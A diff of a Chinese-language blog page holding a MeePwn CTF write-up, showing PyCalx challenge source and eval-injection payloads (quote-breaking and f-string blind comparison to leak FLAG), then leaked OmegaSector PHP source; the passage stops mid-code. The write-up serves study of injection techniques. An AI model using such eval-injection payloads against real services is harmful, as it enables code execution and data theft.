+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;&gt;&gt;&gt; &lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&#39;</span>)
+</code></pre></div><p>很明显我们要想办法获得 FLAG 的值，而这在正常情况下我们是无法读取的，所以需要考虑构造相应的字符串，使得程序会对我们的输入和 FLAG 变量进行比较</p>
 <p>经过一番研究后，发现可以尝试构造如下参数：</p>
-
-<pre><code class="language-JSON">{
-    op:&quot;+'&quot;,
-    value1:&quot;Guess&quot;,
-    value2:&quot;&lt;=FLAG#&quot;
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JSON" data-lang="JSON">{
+    <span style="color:#960050;background-color:#1e0010">op:</span><span style="color:#f92672">&#34;+&#39;&#34;</span>,
+    <span style="color:#960050;background-color:#1e0010">value1:</span><span style="color:#f92672">&#34;Guess&#34;</span>,
+    <span style="color:#960050;background-color:#1e0010">value2:</span><span style="color:#f92672">&#34;&lt;=FLAG#&#34;</span>
 }
-</code></pre>
-
-<p>此时我们构造出了表达式 <code>'Guess'+''&lt;=FLAG#'</code>，在经过 python 的 <code>eval</code> 后对得到相应 <code>True</code> 或 <code>False</code> 的结果</p>
-
+</code></pre></div><p>此时我们构造出了表达式 <code>'Guess'+''&lt;=FLAG#'</code>，在经过 python 的 <code>eval</code> 后对得到相应 <code>True</code> 或 <code>False</code> 的结果</p>
 <p>然后利用 python 字符串比较的规则，可以逐字节猜测 <code>FLAG</code></p>
-
 <p>之后会发现一个问题，即 <code>FLAG</code> 中存在不可猜测的字符，此时我们只猜完了一半的 <code>FLAG</code>，所以需要补充其他的变量</p>
-
 <p>此时发现之前用于显示源代码的 <code>source</code> 变量也同样是可以利用的，所以考虑使用 <code>source</code> 变量</p>
-
 <p>构造 payload 如下：</p>
-
-<pre><code class="language-JSON">{
-    op:&quot;+'&quot;,
-    source: &quot;(&quot;,
-    value1:&quot;MeePwnCTF{python3.66666666666666_&quot;,
-    value2:&quot;+source&lt;=FLAG#&quot;
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JSON" data-lang="JSON">{
+    <span style="color:#960050;background-color:#1e0010">op:</span><span style="color:#f92672">&#34;+&#39;&#34;</span>,
+    <span style="color:#960050;background-color:#1e0010">source:</span> <span style="color:#f92672">&#34;(&#34;</span>,
+    <span style="color:#960050;background-color:#1e0010">value1:</span><span style="color:#f92672">&#34;MeePwnCTF{python3.66666666666666_&#34;</span>,
+    <span style="color:#960050;background-color:#1e0010">value2:</span><span style="color:#f92672">&#34;+source&lt;=FLAG#&#34;</span>
 }
-</code></pre>
-
-<p>接下来的工作是使用脚本进行盲注即可</p>
-
+</code></pre></div><p>接下来的工作是使用脚本进行盲注即可</p>
 <h3 id="2">2</h3>
-
 <p>依旧可以获得源码：</p>
-
-<pre><code class="language-python">#!/usr/bin/env python
-import cgi
-import sys
-from html import escape
-FLAG = open('/var/www/flag','r').read()
-OK_200 = &quot;&quot;&quot;Content-type: text/html
-&lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&quot;&gt;
-&lt;center&gt;
-&lt;title&gt;PyCalx&lt;/title&gt;
-&lt;h1&gt;PyCalx&lt;/h1&gt;
-&lt;form&gt;
-&lt;input class=&quot;form-control col-md-4&quot; type=text name=value1 placeholder='Value 1 (Example: 1  abc)' autofocus/&gt;
-&lt;input class=&quot;form-control col-md-4&quot; type=text name=op placeholder='Operator (Example: + - * ** / // == != )' /&gt;
-&lt;input class=&quot;form-control col-md-4&quot; type=text name=value2 placeholder='Value 2 (Example: 1  abc)' /&gt;
-&lt;input class=&quot;form-control col-md-4 btn btn-success&quot; type=submit value=EVAL /&gt;
-&lt;/form&gt;
-&lt;a href='?source=1'&gt;Source&lt;/a&gt;
-&lt;/center&gt;
-&quot;&quot;&quot;
-print(OK_200)
-arguments = cgi.FieldStorage()
-if 'source' in arguments:
-    source = arguments['source'].value
-else:
-    source = 0
-if source == '1':
-    print('&lt;pre&gt;'+escape(str(open(__file__,'r').read()))+'&lt;/pre&gt;')
-if 'value1' in arguments and 'value2' in arguments and 'op' in arguments:
-    def get_value(val):
-        val = str(val)[:64]
-        if str(val).isdigit(): return int(val)
-        blacklist = ['(',')','[',']','\'','&quot;'] # I don't like tuple, list and dict.
-        if val == '' or [c for c in blacklist if c in val] != []:
-            print('&lt;center&gt;Invalid value&lt;/center&gt;')
-            sys.exit(0)
-        return val
-    def get_op(val):
-        val = str(val)[:2]
-        list_ops = ['+','-','/','*','=','!']
-        if val == '' or val[0] not in list_ops:
-            print('&lt;center&gt;Invalid op&lt;/center&gt;')
-            sys.exit(0)
-        return val
-    op = get_op(get_value(arguments['op'].value))
-    value1 = get_value(arguments['value1'].value)
-    value2 = get_value(arguments['value2'].value)
-    if str(value1).isdigit() ^ str(value2).isdigit():
-        print('&lt;center&gt;Types of the values don\'t match&lt;/center&gt;')
-        sys.exit(0)
-    calc_eval = str(repr(value1)) + str(op) + str(repr(value2))
-    print('&lt;div class=container&gt;&lt;div class=row&gt;&lt;div class=col-md-2&gt;&lt;/div&gt;&lt;div class=&quot;col-md-8&quot;&gt;&lt;pre&gt;')
-    print('&gt;&gt;&gt;&gt; print('+escape(calc_eval)+')')
-    try:
-        result = str(eval(calc_eval))
-        if result.isdigit() or result == 'True' or result == 'False':
-            print(result)
-        else:
-            print(&quot;Invalid&quot;) # Sorry we don't support output as a string due to security issue.
-    except:
-        print(&quot;Invalid&quot;)
-    print('&gt;&gt;&gt; &lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;')
-</code></pre>
-
-<p>diff 之后发现对 <code>op</code> 做了更严格的过滤，意味着我们之前的 payload 无法使用</p>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
+<span style="color:#f92672">import</span> cgi
+<span style="color:#f92672">import</span> sys
+<span style="color:#f92672">from</span> html <span style="color:#f92672">import</span> escape
+FLAG <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;/var/www/flag&#39;</span>,<span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">.</span>read()
+OK_200 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;Content-type: text/html
+</span><span style="color:#e6db74">&lt;link rel=&#34;stylesheet&#34; href=&#34;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&#34;&gt;
+</span><span style="color:#e6db74">&lt;center&gt;
+</span><span style="color:#e6db74">&lt;title&gt;PyCalx&lt;/title&gt;
+</span><span style="color:#e6db74">&lt;h1&gt;PyCalx&lt;/h1&gt;
+</span><span style="color:#e6db74">&lt;form&gt;
+</span><span style="color:#e6db74">&lt;input class=&#34;form-control col-md-4&#34; type=text name=value1 placeholder=&#39;Value 1 (Example: 1  abc)&#39; autofocus/&gt;
+</span><span style="color:#e6db74">&lt;input class=&#34;form-control col-md-4&#34; type=text name=op placeholder=&#39;Operator (Example: + - * ** / // == != )&#39; /&gt;
+</span><span style="color:#e6db74">&lt;input class=&#34;form-control col-md-4&#34; type=text name=value2 placeholder=&#39;Value 2 (Example: 1  abc)&#39; /&gt;
+</span><span style="color:#e6db74">&lt;input class=&#34;form-control col-md-4 btn btn-success&#34; type=submit value=EVAL /&gt;
+</span><span style="color:#e6db74">&lt;/form&gt;
+</span><span style="color:#e6db74">&lt;a href=&#39;?source=1&#39;&gt;Source&lt;/a&gt;
+</span><span style="color:#e6db74">&lt;/center&gt;
+</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+<span style="color:#66d9ef">print</span>(OK_200)
+arguments <span style="color:#f92672">=</span> cgi<span style="color:#f92672">.</span>FieldStorage()
+<span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;source&#39;</span> <span style="color:#f92672">in</span> arguments:
+    source <span style="color:#f92672">=</span> arguments[<span style="color:#e6db74">&#39;source&#39;</span>]<span style="color:#f92672">.</span>value
+<span style="color:#66d9ef">else</span>:
+    source <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+<span style="color:#66d9ef">if</span> source <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;1&#39;</span>:
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;&lt;pre&gt;&#39;</span><span style="color:#f92672">+</span>escape(str(open(__file__,<span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">.</span>read()))<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;&lt;/pre&gt;&#39;</span>)
+<span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;value1&#39;</span> <span style="color:#f92672">in</span> arguments <span style="color:#f92672">and</span> <span style="color:#e6db74">&#39;value2&#39;</span> <span style="color:#f92672">in</span> arguments <span style="color:#f92672">and</span> <span style="color:#e6db74">&#39;op&#39;</span> <span style="color:#f92672">in</span> arguments:
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_value</span>(val):
+        val <span style="color:#f92672">=</span> str(val)[:<span style="color:#ae81ff">64</span>]
+        <span style="color:#66d9ef">if</span> str(val)<span style="color:#f92672">.</span>isdigit(): <span style="color:#66d9ef">return</span> int(val)
+        blacklist <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;(&#39;</span>,<span style="color:#e6db74">&#39;)&#39;</span>,<span style="color:#e6db74">&#39;[&#39;</span>,<span style="color:#e6db74">&#39;]&#39;</span>,<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74">&#39;&#34;&#39;</span>] <span style="color:#75715e"># I don&#39;t like tuple, list and dict.</span>
+        <span style="color:#66d9ef">if</span> val <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">or</span> [c <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> blacklist <span style="color:#66d9ef">if</span> c <span style="color:#f92672">in</span> val] <span style="color:#f92672">!=</span> []:
+            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;&lt;center&gt;Invalid value&lt;/center&gt;&#39;</span>)
+            sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
+        <span style="color:#66d9ef">return</span> val
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_op</span>(val):
+        val <span style="color:#f92672">=</span> str(val)[:<span style="color:#ae81ff">2</span>]
+        list_ops <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;+&#39;</span>,<span style="color:#e6db74">&#39;-&#39;</span>,<span style="color:#e6db74">&#39;/&#39;</span>,<span style="color:#e6db74">&#39;*&#39;</span>,<span style="color:#e6db74">&#39;=&#39;</span>,<span style="color:#e6db74">&#39;!&#39;</span>]
+        <span style="color:#66d9ef">if</span> val <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">or</span> val[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> list_ops:
+            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;&lt;center&gt;Invalid op&lt;/center&gt;&#39;</span>)
+            sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
+        <span style="color:#66d9ef">return</span> val
+    op <span style="color:#f92672">=</span> get_op(get_value(arguments[<span style="color:#e6db74">&#39;op&#39;</span>]<span style="color:#f92672">.</span>value))
+    value1 <span style="color:#f92672">=</span> get_value(arguments[<span style="color:#e6db74">&#39;value1&#39;</span>]<span style="color:#f92672">.</span>value)
+    value2 <span style="color:#f92672">=</span> get_value(arguments[<span style="color:#e6db74">&#39;value2&#39;</span>]<span style="color:#f92672">.</span>value)
+    <span style="color:#66d9ef">if</span> str(value1)<span style="color:#f92672">.</span>isdigit() <span style="color:#f92672">^</span> str(value2)<span style="color:#f92672">.</span>isdigit():
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;&lt;center&gt;Types of the values don</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">t match&lt;/center&gt;&#39;</span>)
+        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
+    calc_eval <span style="color:#f92672">=</span> str(repr(value1)) <span style="color:#f92672">+</span> str(op) <span style="color:#f92672">+</span> str(repr(value2))
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;&lt;div class=container&gt;&lt;div class=row&gt;&lt;div class=col-md-2&gt;&lt;/div&gt;&lt;div class=&#34;col-md-8&#34;&gt;&lt;pre&gt;&#39;</span>)
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;&gt;&gt;&gt;&gt; print(&#39;</span><span style="color:#f92672">+</span>escape(calc_eval)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;)&#39;</span>)
+    <span style="color:#66d9ef">try</span>:
+        result <span style="color:#f92672">=</span> str(eval(calc_eval))
+        <span style="color:#66d9ef">if</span> result<span style="color:#f92672">.</span>isdigit() <span style="color:#f92672">or</span> result <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;True&#39;</span> <span style="color:#f92672">or</span> result <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;False&#39;</span>:
+            <span style="color:#66d9ef">print</span>(result)
+        <span style="color:#66d9ef">else</span>:
+            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Invalid&#34;</span>) <span style="color:#75715e"># Sorry we don&#39;t support output as a string due to security issue.</span>
+    <span style="color:#66d9ef">except</span>:
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Invalid&#34;</span>)
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;&gt;&gt;&gt; &lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&#39;</span>)
+</code></pre></div><p>diff 之后发现对 <code>op</code> 做了更严格的过滤，意味着我们之前的 payload 无法使用</p>
 <p>可以考虑使用 python3.6 的新特性，新的格式化字符串语法：<code>f'{}'</code>，具体可以参考：Python3.6新的字符串格式化语法</p>
-
 <p>可以考虑构造这样的 payload：</p>
-
-<pre><code class="language-JSON">{
-    op:&quot;+f&quot;,
-    source:&quot;MeePwnCTF&quot;,
-    value1:&quot;True&quot;,
-    value2:&quot;{sys.__package__ if source &lt;= FLAG else 0/0}&quot;
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JSON" data-lang="JSON">{
+    <span style="color:#960050;background-color:#1e0010">op:</span><span style="color:#f92672">&#34;+f&#34;</span>,
+    <span style="color:#960050;background-color:#1e0010">source:</span><span style="color:#f92672">&#34;MeePwnCTF&#34;</span>,
+    <span style="color:#960050;background-color:#1e0010">value1:</span><span style="color:#f92672">&#34;True&#34;</span>,
+    <span style="color:#960050;background-color:#1e0010">value2:</span><span style="color:#f92672">&#34;{sys.__package__ if source &lt;= FLAG else 0/0}&#34;</span>
 }
-</code></pre>
-
-<p>此时我们构造出了类似报错注入的表达式：<code>'True'+f'{sys.__package__ if source &lt;= FLAG else 0/0}'</code></p>
-
+</code></pre></div><p>此时我们构造出了类似报错注入的表达式：<code>'True'+f'{sys.__package__ if source &lt;= FLAG else 0/0}'</code></p>
 <p>由于 <code>sys.__package__</code> 等于 <code>''</code>，所以如果比较的结果正确，页面将显示 <code>True</code>，错误将显示 <code>Invalid</code></p>
-
 <p>继续使用脚本即可爆破出 flag</p>
-
 <h3 id="poc">poc</h3>
-
-<p>相应脚本如下：<a href="https://gist.github.com/syang2forever/b0bdd589c2c4815081f8dee788e5a832" rel="nofollow noreferrer" target="_blank">solve.py</a></p>
-
+<p>相应脚本如下：<a href="https://gist.github.com/syang2forever/b0bdd589c2c4815081f8dee788e5a832">solve.py</a></p>
 <h2 id="omegasector">OmegaSector</h2>
-
-<p>首先是 <a href="http://138.68.228.12/?is_debug=1" rel="nofollow noreferrer" target="_blank">http://138.68.228.12/?is_debug=1</a> 有源码泄漏：</p>
-
-<pre><code class="language-php">&lt;?php 
-ob_start(); 
-session_start(); 
-?&gt; 
-&lt;html&gt; 
-&lt;style type=&quot;text/css&quot;&gt;* {cursor: url(assets/maplcursor.cur), auto !important;}&lt;/style&gt; 
-&lt;head&gt; 
-  &lt;link rel=&quot;stylesheet&quot; href=&quot;assets/omega_sector.css&quot;&gt; 
-  &lt;link rel=&quot;stylesheet&quot; href=&quot;assets/tsu_effect.css&quot;&gt; 
-&lt;/head&gt; 
-&lt;?php 
-ini_set(&quot;display_errors&quot;, 0); 
-include('secret.php'); 
-$remote=$_SERVER['REQUEST_URI']; 
-if(strpos(urldecode($remote),'..')) 
+<p>首先是 http://138.68.228.12/?is_debug=1 有源码泄漏：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span> 
+<span style="color:#a6e22e">ob_start</span>(); 
+<span style="color:#a6e22e">session_start</span>(); 
+<span style="color:#75715e">?&gt;</span> 
+&lt;<span style="color:#f92672">html</span>&gt; 
+&lt;<span style="color:#f92672">style</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span>&gt;<span style="color:#f92672">*</span> {<span style="color:#66d9ef">cursor</span>: url(<span style="color:#e6db74">assets/maplcursor.cur</span>), <span style="color:#66d9ef">auto</span> <span style="color:#75715e">!important</span>;}&lt;/<span style="color:#f92672">style</span>&gt; 
+&lt;<span style="color:#f92672">head</span>&gt; 
+  &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;assets/omega_sector.css&#34;</span>&gt; 
+  &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;assets/tsu_effect.css&#34;</span>&gt; 
+&lt;/<span style="color:#f92672">head</span>&gt; 
+<span style="color:#75715e">&lt;?php</span> 
+<span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#34;display_errors&#34;</span>, <span style="color:#ae81ff">0</span>); 
+<span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#39;secret.php&#39;</span>); 
+$remote<span style="color:#f92672">=</span>$_SERVER[<span style="color:#e6db74">&#39;REQUEST_URI&#39;</span>]; 
+<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strpos</span>(<span style="color:#a6e22e">urldecode</span>($remote),<span style="color:#e6db74">&#39;..&#39;</span>)) 
 { 
-mapl_die(); 
+<span style="color:#a6e22e">mapl_die</span>(); 
 } 
-if(!parse_url($remote, PHP_URL_HOST)) 
+<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">parse_url</span>($remote, <span style="color:#a6e22e">PHP_URL_HOST</span>)) 
 { 
-    $remote='http://'.$_SERVER['REMOTE_ADDR'].$_SERVER['REQUEST_URI']; 
+    $remote<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://&#39;</span><span style="color:#f92672">.</span>$_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>]<span style="color:#f92672">.</span>$_SERVER[<span style="color:#e6db74">&#39;REQUEST_URI&#39;</span>]; 
 } 
-$whoareyou=parse_url($remote, PHP_URL_HOST); 
-if($whoareyou===&quot;alien.somewhere.meepwn.team&quot;) 
+$whoareyou<span style="color:#f92672">=</span><span style="color:#a6e22e">parse_url</span>($remote, <span style="color:#a6e22e">PHP_URL_HOST</span>); 
+<span style="color:#66d9ef">if</span>($whoareyou<span style="color:#f92672">===</span><span style="color:#e6db74">&#34;alien.somewhere.meepwn.team&#34;</span>) 
 { 
-    if(!isset($_GET['alien'])) 
+    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;alien&#39;</span>])) 
     { 
-        $wrong = &lt;&lt;&lt;EOF 
-&lt;h2 id=&quot;intro&quot; class=&quot;neon&quot;&gt;You will be driven to hidden-street place in omega sector which is only for alien! Please verify your credentials first to get into the taxi!&lt;/h2&gt; 
-&lt;h1 id=&quot;main&quot; class=&quot;shadow&quot;&gt;Are You ALIEN??&lt;/h1&gt; 
-&lt;form id=&quot;main&quot;&gt; 
-    &lt;button type=&quot;submit&quot; class=&quot;button-success&quot; name=&quot;alien&quot; value=&quot;Yes&quot;&gt;Yes&lt;/button&gt; 
-    &lt;button type=&quot;submit&quot; class=&quot;button-error&quot; name=&quot;alien&quot; value=&quot;No&quot;&gt;No&lt;/button&gt; 
-&lt;/form&gt; 
-&lt;img src=&quot;assets/taxi.png&quot; id=&quot;taxi&quot; width=&quot;15%&quot; height=&quot;20%&quot; /&gt; 
-EOF; 
-        echo $wrong; 
+        $wrong <span style="color:#f92672">=</span> <span style="color:#f92672">&lt;&lt;&lt;</span><span style="color:#a6e22e">EOF</span> 
+<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">h2</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;intro&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;neon&#34;</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">You</span> <span style="color:#a6e22e">will</span> <span style="color:#a6e22e">be</span> <span style="color:#a6e22e">driven</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">hidden</span><span style="color:#f92672">-</span><span style="color:#a6e22e">street</span> <span style="color:#a6e22e">place</span> <span style="color:#a6e22e">in</span> <span style="color:#a6e22e">omega</span> <span style="color:#a6e22e">sector</span> <span style="color:#a6e22e">which</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">only</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">alien</span><span style="color:#f92672">!</span> <span style="color:#a6e22e">Please</span> <span style="color:#a6e22e">verify</span> <span style="color:#a6e22e">your</span> <span style="color:#a6e22e">credentials</span> <span style="color:#a6e22e">first</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">get</span> <span style="color:#a6e22e">into</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">taxi</span><span style="color:#f92672">!&lt;/</span><span style="color:#a6e22e">h2</span><span style="color:#f92672">&gt;</span> 
+<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">h1</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;main&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;shadow&#34;</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">Are</span> <span style="color:#a6e22e">You</span> <span style="color:#a6e22e">ALIEN</span><span style="color:#f92672">??&lt;/</span><span style="color:#a6e22e">h1</span><span style="color:#f92672">&gt;</span> 
+<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;main&#34;</span><span style="color:#f92672">&gt;</span> 
+    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">button</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;button-success&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;alien&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Yes&#34;</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">Yes</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">button</span><span style="color:#f92672">&gt;</span> 
+    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">button</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;button-error&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;alien&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;No&#34;</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">No</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">button</span><span style="color:#f92672">&gt;</span> 
+<span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">form</span><span style="color:#f92672">&gt;</span> 
+<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;assets/taxi.png&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;taxi&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;15%&#34;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;20%&#34;</span> <span style="color:#f92672">/&gt;</span> 
+<span style="color:#a6e22e">EOF</span>; 
+        <span style="color:#66d9ef">echo</span> $wrong; 
     } 
-    if(isset($_GET['alien']) and !empty($_GET['alien'])) 
+    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;alien&#39;</span>]) <span style="color:#66d9ef">and</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_GET[<span style="color:#e6db74">&#39;alien&#39;</span>])) 
     { 
-         if($_GET['alien']==='@!#$@!@@') 
+         <span style="color:#66d9ef">if</span>($_GET[<span style="color:#e6db74">&#39;alien&#39;</span>]<span style="color:#f92672">===</span><span style="color:#e6db74">&#39;@!#$@!@@&#39;</span>) 
         { 
-            $_SESSION['auth']=hash('sha256', 'alien'.$salt); 
-            exit(header( &quot;Location: alien_sector.php&quot; )); 
+            $_SESSION[<span style="color:#e6db74">&#39;auth&#39;</span>]<span style="color:#f92672">=</span><span style="color:#a6e22e">hash</span>(<span style="color:#e6db74">&#39;sha256&#39;</span>, <span style="color:#e6db74">&#39;alien&#39;</span><span style="color:#f92672">.</span>$salt); 
+            <span style="color:#66d9ef">exit</span>(<span style="color:#a6e22e">header</span>( <span style="color:#e6db74">&#34;Location: alien_sector.php&#34;</span> )); 
         } 
-        else 
+        <span style="color:#66d9ef">else</span> 
         { 
-            mapl_die(); 
+            <span style="color:#a6e22e">mapl_die</span>(); 
         } 
     } 
 } 
-elseif($whoareyou===&quot;human.ludibrium.meepwn.team&quot;) 
+<span style="color:#66d9ef">elseif</span>($whoareyou<span style="color:#f92672">===</span><span style="color:#e6db74">&#34;human.ludibrium.meepwn.team&#34;</span>) 
 { 
      
-    if(!isset($_GET['human'])) 
+    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;human&#39;</span>])) 
     { 
-        echo &quot;&quot;; 
-        $wrong = &lt;&lt;&lt;EOF 
-&lt;h2 id=&quot;intro&quot; class=&quot;neon&quot;&gt;hellu human, welcome to omega sector, please verify your credentials to get into the taxi!&lt;/h2&gt; 
-&lt;h1 id=&quot;main&quot; class=&quot;shadow&quot;&gt;Are You Human?&lt;/h1&gt; 
-&lt;form id=&quot;main&quot;&gt; 
-    &lt;button type=&quot;submit&quot; class=&quot;button-success&quot; name=&quot;human&quot; value=&quot;Yes&quot;&gt;Yes&lt;/button&gt; 
-    &lt;button type=&quot;submit&quot; class=&quot;button-error&quot; name=&quot;human&quot; value=&quot;No&quot;&gt;No&lt;/button&gt; 
-&lt;/form&gt; 
-&lt;img src=&quot;assets/taxi.png&quot; id=&quot;taxi&quot; width=&quot;15%&quot; height=&quot;20%&quot; /&gt; 
-EOF; 
-        echo $wrong; 
+        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&#34;</span>; 
+        $wrong <span style="color:#f92672">=</span> <span style="color:#f92672">&lt;&lt;&lt;</span><span style="color:#a6e22e">EOF</span> 
+<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">h2</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;intro&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;neon&#34;</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">hellu</span> <span style="color:#a6e22e">human</span>, <span style="color:#a6e22e">welcome</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">omega</span> <span style="color:#a6e22e">sector</span>, <span style="color:#a6e22e">please</span> <span style="color:#a6e22e">verify</span> <span style="color:#a6e22e">your</span> <span style="color:#a6e22e">credentials</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">get</span> <span style="color:#a6e22e">into</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">taxi</span><span style="color:#f92672">!&lt;/</span><span style="color:#a6e22e">h2</span><span style="color:#f92672">&gt;</span> 
